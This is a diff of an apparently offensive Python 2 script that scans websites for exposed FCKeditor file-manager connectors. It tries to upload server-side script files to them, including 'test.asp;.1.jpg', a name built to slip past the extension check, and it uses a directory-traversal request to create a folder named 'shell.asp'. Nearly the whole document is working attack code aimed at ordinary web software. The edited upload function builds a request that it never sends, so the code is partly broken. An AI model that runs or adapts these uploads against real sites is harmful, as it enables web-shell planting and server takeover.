@@ -26,92 +26,59 @@ def shell_handler():
     if response(url,"editor/filemanager/upload/php/upload.php").getcode() == 200:
         upload_url = url+"/editor/filemanager/upload/php/upload.php?Type=Media"
         try:
-            upload(upload_url)
+            upload(upload_url,'NewFile','testphp.php')
         except:
             pass;
         #<inputtype="file" name="NewFile" size="50"><br>
         #        <input id="btnUpload" type="submit" value="Upload">
         #        </form>
-    elif response(url,"/editor/filemanager/browser/default/connectors/test.html").getcode() == 200:
-        upload_url = url+"/editor/filemanager/browser/default/connectors/test.html"
+    elif response(url,"editor/filemanager/browser/default/connectors/test.html").getcode() == 200:
+        upload_url = url+"/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/"
         try:
-            upload(upload_url)
+            upload(upload_url,'NewFile','testphp.php')
         except:
             pass
 
-    elif response(url,"/editor/filemanager/upload/test.html").getcode() == 200:
-        upload_url = url+"/editor/filemanager/upload/test.html"
+
+    elif response(url,"editor/filemanager/browser/default/browser.html").getcode() == 200:
+        upload_url = url+"editor/filemanager/browser/default/browser.html?Type=Image&Connector="+url+"editor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php"
         try:
-            upload(upload_url)
-        except:
-            pass
-    elif response(url,"/editor/filemanager/upload/test.html").getcode() == 200:
-        upload_url = url+"/editor/filemanager/upload/test.html"
-        try:
-            upload(upload_url)
-        except:
-            pass
-    elif response(url,"/editor/filemanager/connectors/uploadtest.html").getcode() == 200:
-        upload_url = url+"/editor/filemanager/connectors/uploadtest.html"
-        try:
-            upload(upload_url)
+            upload(upload_url,'Newfile','testphp.php')
         except:
             pass
 
-    elif response(url,"FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/").getcode() == 200:
-        upload_url = url+"FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/"
+    elif response(url,"/editor/filemanager/upload/asp/upload.asp?Type=Image").getcode() == 200:
+        upload_url = url+"/editor/filemanager/upload/asp/upload.asp?Type=Image"
         try:
-            upload(upload_url)
+            upload(upload_url,'Newfile',"test.asp;.1.jpg")
         except:
             pass
 
-    elif response(url,"FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp").getcode() == 200:
-        upload_url = url+"FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp"
+    elif response(url,"editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp").getcode() == 200:
+        upload_url = url+"editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp"
         try:
-            upload(upload_url)
+            upload(upload_url,'Newfile','test.jsp')
         except:
             pass
 
-    elif response(url,"FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php").getcode() == 200:
-        upload_url = url+"FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php"
-        try:
-            upload(upload_url)
-        except:
-            pass
 
-    elif response(url,"FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp").getcode() == 200:
-        upload_url = url+"FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp"
-        try:
-            upload(upload_url)
-        except:
-            pass
-
-    elif response(url,"FCKeditor/_samples/default.html").getcode() == 200:
-        upload_url = url+"FCKeditor/_samples/default.html"
-        try:
-            upload(upload_url)
-        except:
-            pass
-
-    elif response(url,"FCKeditor/_samples/asp/sample01.asp").getcode() == 200:
-        upload_url = url+"FCKeditor/_samples/asp/sample01.asp"
-        try:
-            upload(upload_url)
-        except:
-            pass
     else:
         pass
 
-def upload():
-    opener = poster.streaminghttp.register_openers()
-    opener.add_handler(urllib2.HTTPCookieProcessor(cookielib.CookieJar()))
-    params = {'file': open("sysinfo.asp", "rb"), 'name': 'NewFile'}
-    datagen, headers = poster.encode.multipart_encode(params)
+def upload(upload_url,params,filename):
+    ##opener = poster.streaminghttp.register_openers()
+    #opener.add_handler(urllib2.HTTPCookieProcessor(cookielib.CookieJar()))
+    #params = {'file': open("sysinfo.asp", "rb"), 'name': 'NewFile'}
+    #datagen, headers = poster.encode.multipart_encode(params)
+    #request = urllib2.Request(upload_url, datagen, headers)
+    #result = urllib2.urlopen(request)
+    register_openers()
+    datagen, headers = multipart_encode({params: open(filename, "rb")})
     request = urllib2.Request(upload_url, datagen, headers)
-    result = urllib2.urlopen(request)
+
 
 def index_of():
-    index_urls = ['/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F','/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F','/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../..%2F&NewFolderName=shell.asp']
+    index_urls = ['editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F','editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F','editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../..%2F&NewFolderName=shell.asp']
     index_dics = ['Index of','parent dictionary']
     for index_url in index_urls:
         html = urllib.urlopen(url+index_url)
@@ -119,7 +86,7 @@ def index_of():
             pattern = re.compile(index_dic)
             match = html.search(pattern)
             if match:
-                print color_pr.red("[!]Fckeditor with a dic xday==>\n"+index_dic+'\n')
+                print "[!]Fckeditor with a dic xday==>\n"+index_dic+'\n'
 
 def xpath():
     xpath_dics =['FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp','/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2F&NewFolderName=aux']
